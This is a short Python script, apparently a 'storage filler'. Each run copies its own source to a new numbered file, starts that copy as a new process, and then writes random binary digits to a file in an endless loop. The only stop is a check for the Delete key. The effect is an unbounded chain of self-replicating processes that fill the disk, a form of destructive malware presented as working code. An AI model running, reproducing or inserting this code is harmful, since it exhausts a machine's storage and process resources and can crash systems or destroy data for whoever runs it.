import os, keyboard, subprocess, sys

# Get index from filename (e.g., storage_filler0.py)
try:
    current_index = int(sys.argv[1])
except (IndexError, ValueError):
    current_index = 0  # default for initial run

next_index = current_index + 1
next_file = f"storage_filler{next_index}.py"
binary_file = f"binary{current_index}.txt"

# Only spawn next file if it doesn't exist
if not os.path.exists(next_file):
    with open(next_file, "w") as f:
        f.write(open(__file__).read())

    subprocess.Popen(["python", next_file, str(next_index)])
# Write to the corresponding binaryN.txt file
with open(binary_file, "w") as f:
    while True:
        if keyboard.is_pressed("delete"):
            break
        f.write(str(__import__('random').randint(0, 1)))
        f.flush()
